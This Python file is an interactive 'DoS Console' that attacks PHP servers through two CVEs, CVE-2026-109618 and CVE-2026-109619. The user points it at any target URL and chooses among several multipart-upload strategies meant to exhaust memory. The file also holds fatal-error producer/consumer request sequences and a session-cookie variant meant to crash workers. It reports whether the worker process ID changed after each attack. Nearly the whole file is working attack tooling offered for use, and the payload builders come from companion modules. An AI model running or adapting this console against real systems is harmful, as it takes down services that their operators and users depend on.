#!/usr/bin/env python3
"""Interactive DoS console for PHP CVE-2026-109618 / CVE-2026-109619."""

import json
import shlex
import sys
import time
from pathlib import Path

try:
    import readline
except ImportError:
    try:
        import pyreadline3 as readline
    except ImportError:
        pass

from attacker import (
    BOUNDARY, parse_target, endpoint_path, send,
    multipart_part_headers, multipart_empty_files, multipart_form_value,
    multipart_files_registration,
)
from session_progress_probe import (
    multipart_producer, multipart_consumer,
    request as session_request,
)

BANNER = r"""
  ____  _   _ ____                _ ____       ____
 |  _ \| | | |  _ \      _   _ _(_)  _ \  ___/ ___|
 | |_) | |_| | |_) |____| | | | '_ \| | |/ _ \\___ \
 |  __/|  _  |  __/_____|_|_| | | | | |_| (_) |___) |
 |_|   |_| |_|_|        \__,_|_| |_|____/ \___/|____/

  PHP CVE-2026-109618 / CVE-2026-109619  DoS Console
"""

HELP = """
Commands:
  target <url>                Set target URL (e.g. http://192.168.1.10:8088)
  show                        Show current settings
  health                      Send health check to target
  109618 [strategy]           Execute CVE-2026-109618 OOM attack
                              Strategies: part-headers, empty-files, form-value, files-registration
  109619                      Execute CVE-2026-109619 cross-request crash (fatal-backtrace)
  session                     Execute CVE-2026-109619 session lifecycle probe
  set <key> <value>           Set parameter (see 'set' for list)
  help                        Show this help
  exit / quit                 Exit
"""

SET_HELP = """
Settable parameters:
  health <path>               Health endpoint (default: health.php)
  upload <path>               Upload endpoint (default: upload.php)
  producer <path>             Fatal producer endpoint (default: fatal-backtrace.php)
  consumer <path>             Early consumer endpoint (default: health.php)
  seed <path>                 Session seed endpoint (default: session/session-seed.php)
  session-health <path>       Session health endpoint (default: session/health.php)
  session-upload <path>       Session upload endpoint (default: session/upload.php)
  part-headers <n>            Part header count for OOM (default: 5000)
  empty-files <n>             Empty file count for OOM (default: 500)
  field-bytes <n>             Form value size for OOM (default: 6291456)
  timeout <seconds>           Request timeout (default: 15)
  expected-php <version>      Expected PHP version (default: 8.5.11)
"""


class Console:
    def __init__(self):
        self.target = None
        self.scheme = self.host = self.port = self.prefix = None
        self.endpoints = {
            "health": "health.php",
            "upload": "upload.php",
            "producer": "fatal-backtrace.php",
            "consumer": "health.php",
            "seed": "session/session-seed.php",
            "session-health": "session/health.php",
            "session-upload": "session/upload.php",
        }
        self.part_headers = 5000
        self.empty_files = 500
        self.field_bytes = 6 * 1024 * 1024
        self.pad_kib = 1340
        self.field_name_kib = 700
        self.timeout = 15.0
        self.expected_php = "8.5.11"

    def path(self, name):
        return endpoint_path(self.prefix, self.endpoints[name])

    def run(self):
        print(BANNER)
        if len(sys.argv) > 1:
            self.cmd_target(sys.argv[1])
        while True:
            try:
                line = input("\033[1;31mDoS>\033[0m ").strip().lstrip("﻿")
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if not line:
                continue
            parts = shlex.split(line)
            cmd = parts[0].lower()
            args = parts[1:]
            handler = {
                "target": self.cmd_target,
                "show": lambda *_: self.cmd_show(),
                "health": lambda *_: self.cmd_health(),
                "109618": self.cmd_109618,
                "109619": lambda *_: self.cmd_109619(),
                "session": lambda *_: self.cmd_session(),
                "set": self.cmd_set,
                "help": lambda *_: print(HELP),
                "exit": lambda *_: sys.exit(0),
                "quit": lambda *_: sys.exit(0),
            }.get(cmd)
            if handler is None:
                print(f"Unknown command: {cmd}. Type 'help' for commands.")
                continue
            try:
                handler(*args)
            except Exception as exc:
                print(f"\033[91mError: {exc}\033[0m")

    def require_target(self):
        if self.target is None:
            raise RuntimeError("No target set. Use: target <url>")

    def cmd_target(self, url=None):
        if url is None:
            if self.target:
                print(f"Current target: {self.target}")
            else:
                print("No target set. Usage: target <url>")
            return
        self.scheme, self.host, self.port, self.prefix = parse_target(url)
        self.target = url
        print(f"\033[92mTarget set: {self.scheme}://{self.host}:{self.port}{self.prefix}\033[0m")

    def cmd_show(self):
        print(f"  target:        {self.target or '(not set)'}")
        for k, v in self.endpoints.items():
            print(f"  {k:16s} {v}")
        print(f"  part-headers:  {self.part_headers}")
        print(f"  empty-files:   {self.empty_files}")
        print(f"  field-bytes:   {self.field_bytes}")
        print(f"  timeout:       {self.timeout}s")
        print(f"  expected-php:  {self.expected_php}")

    def cmd_health(self):
        self.require_target()
        print(f"GET {self.path('health')} ...")
        result = send(self.scheme, self.host, self.port, "GET",
                      self.path("health"), self.timeout, None, "health-check")
        if "transport_error" in result:
            print(f"\033[91m{result['transport_error']}\033[0m")
            return
        print(f"HTTP {result['http_status']} ({result['elapsed_ms']}ms)")
        try:
            data = json.loads(result.get("body_prefix", ""))
            print(f"  PHP:  {data.get('php')}")
            print(f"  SAPI: {data.get('sapi')}")
            print(f"  PID:  {data.get('pid')}")
            print(f"  Mem:  {data.get('memory_limit')}")
        except json.JSONDecodeError:
            print(f"  Body: {result.get('body_prefix', '')[:200]}")

    def cmd_109618(self, strategy=None):
        self.require_target()
        strategy = strategy or "part-headers"
        strategies = {
            "part-headers": lambda: multipart_part_headers(self.part_headers),
            "empty-files": lambda: multipart_empty_files(self.empty_files),
            "form-value": lambda: multipart_form_value(self.field_bytes),
            "files-registration": lambda: multipart_files_registration(
                self.pad_kib * 1024, self.field_name_kib * 1024),
        }
        if strategy not in strategies:
            print(f"Unknown strategy. Choose: {', '.join(strategies)}")
            return

        print(f"\033[93m[CVE-2026-109618] OOM attack — {strategy}\033[0m")
        print("Step 1: Health check (baseline)...")
        baseline = send(self.scheme, self.host, self.port, "GET",
                        self.path("health"), self.timeout, None, "baseline")
        pid_before = baseline.get("worker_pid_header", "?")
        print(f"  PID: {pid_before}, HTTP {baseline.get('http_status', 'error')}")

        body = strategies[strategy]()
        print(f"Step 2: Sending {len(body):,} byte multipart ({strategy})...")
        result = send(self.scheme, self.host, self.port, "POST",
                      self.path("upload"), self.timeout, None, "oom-candidate",
                      body, f"multipart/form-data; boundary={BOUNDARY}")
        if "transport_error" in result:
            print(f"  \033[91m{result['transport_error']}\033[0m")
        else:
            print(f"  HTTP {result['http_status']} ({result['elapsed_ms']}ms)")
            body_text = result.get("body_prefix", "")
            if "Fatal error" in body_text or "Allowed memory" in body_text:
                print(f"  \033[93mOOM triggered!\033[0m")
            print(f"  Body: {body_text[:200]}")

        print("Step 3: Health check (after)...")
        after = send(self.scheme, self.host, self.port, "GET",
                     self.path("health"), self.timeout, None, "after")
        pid_after = after.get("worker_pid_header", "?")
        print(f"  PID: {pid_after}, HTTP {after.get('http_status', 'error')}")

        if pid_before != "?" and pid_after != "?" and pid_before != pid_after:
            print(f"\033[91m  Worker crashed! PID {pid_before} -> {pid_after}\033[0m")
        elif pid_before == pid_after:
            print(f"  Worker survived (PID unchanged: {pid_before})")

    def cmd_109619(self):
        self.require_target()
        print(f"\033[93m[CVE-2026-109619] Cross-request crash\033[0m")
        print("Step 1: Health check (baseline)...")
        baseline = send(self.scheme, self.host, self.port, "GET",
                        self.path("health"), self.timeout, None, "baseline")
        pid_before = baseline.get("worker_pid_header", "?")
        print(f"  PID: {pid_before}, HTTP {baseline.get('http_status', 'error')}")

        print("Step 2: Fatal producer...")
        producer = send(self.scheme, self.host, self.port, "GET",
                        self.path("producer"), self.timeout, None, "fatal-producer")
        if "transport_error" in producer:
            print(f"  \033[91m{producer['transport_error']}\033[0m")
        else:
            print(f"  HTTP {producer['http_status']} ({producer['elapsed_ms']}ms)")

        print("Step 3: Early consumer...")
        consumer = send(self.scheme, self.host, self.port, "GET",
                        self.path("consumer"), self.timeout, None, "early-consumer")
        if "transport_error" in consumer:
            print(f"  \033[91m{consumer['transport_error']}\033[0m")
            print(f"  \033[91mWorker likely crashed!\033[0m")
        else:
            pid_after = consumer.get("worker_pid_header", "?")
            print(f"  PID: {pid_after}, HTTP {consumer['http_status']}")
            if pid_before != "?" and pid_after != "?" and pid_before != pid_after:
                print(f"\033[91m  Worker crashed! PID {pid_before} -> {pid_after}\033[0m")

    def cmd_session(self):
        self.require_target()
        print(f"\033[93m[CVE-2026-109619] Session lifecycle probe\033[0m")

        print("Step 1: Session health check...")
        health, _ = session_request(self.scheme, self.host, self.port, "GET",
                                    self.path("session-health"), timeout=self.timeout)
        if "transport_error" in health:
            print(f"  \033[91m{health['transport_error']}\033[0m")
            return
        pid_before = health.get("worker_pid_header", "?")
        print(f"  PID: {pid_before}, HTTP {health.get('http_status')}")

        print("Step 2: Acquiring session cookie...")
        seed, set_cookie = session_request(self.scheme, self.host, self.port, "GET",
                                           self.path("seed"), timeout=self.timeout)
        if "transport_error" in seed:
            print(f"  \033[91m{seed['transport_error']}\033[0m")
            return
        if not set_cookie:
            print("  \033[91mNo session cookie received\033[0m")
            return
        cookie = set_cookie.split(";")[0]
        print(f"  Got session cookie")

        producer_body = multipart_producer(self.field_bytes, "candidate")
        print(f"Step 3: Producer (OOM with session progress, {len(producer_body):,} bytes)...")
        producer, _ = session_request(self.scheme, self.host, self.port, "POST",
                                      self.path("session-upload"), body=producer_body,
                                      cookie=cookie, timeout=self.timeout)
        if "transport_error" in producer:
            print(f"  \033[91m{producer['transport_error']}\033[0m")
        else:
            body_text = producer.get("body_prefix", "")
            print(f"  HTTP {producer.get('http_status')} ({producer.get('elapsed_ms')}ms)")
            if "Fatal error" in body_text:
                print(f"  \033[93mOOM triggered\033[0m")

        consumer_body = multipart_consumer()
        print("Step 4: Consumer (session progress callback on stale state)...")
        consumer, _ = session_request(self.scheme, self.host, self.port, "POST",
                                      self.path("session-upload"), body=consumer_body,
                                      cookie=cookie, timeout=self.timeout)
        if "transport_error" in consumer:
            print(f"  \033[91m{consumer['transport_error']}\033[0m")
            print(f"  \033[91mWorker crashed! (connection reset)\033[0m")
        else:
            pid_after = consumer.get("worker_pid_header", "?")
            print(f"  PID: {pid_after}, HTTP {consumer.get('http_status')}")
            if pid_before != "?" and pid_after != "?" and pid_before != pid_after:
                print(f"\033[91m  Worker crashed! PID {pid_before} -> {pid_after}\033[0m")
            elif pid_before == pid_after:
                print(f"  Worker survived (PID unchanged)")

    def cmd_set(self, key=None, value=None, *_):
        if key is None:
            print(SET_HELP)
            return
        if value is None:
            print(f"Usage: set {key} <value>")
            return
        if key in self.endpoints:
            self.endpoints[key] = value
            print(f"  {key} = {value}")
        elif key == "part-headers":
            self.part_headers = int(value)
            print(f"  part-headers = {self.part_headers}")
        elif key == "empty-files":
            self.empty_files = int(value)
            print(f"  empty-files = {self.empty_files}")
        elif key == "field-bytes":
            self.field_bytes = int(value)
            print(f"  field-bytes = {self.field_bytes}")
        elif key == "timeout":
            self.timeout = float(value)
            print(f"  timeout = {self.timeout}s")
        elif key == "expected-php":
            self.expected_php = value
            print(f"  expected-php = {self.expected_php}")
        else:
            print(f"Unknown parameter: {key}")
            print(SET_HELP)


if __name__ == "__main__":
    Console().run()
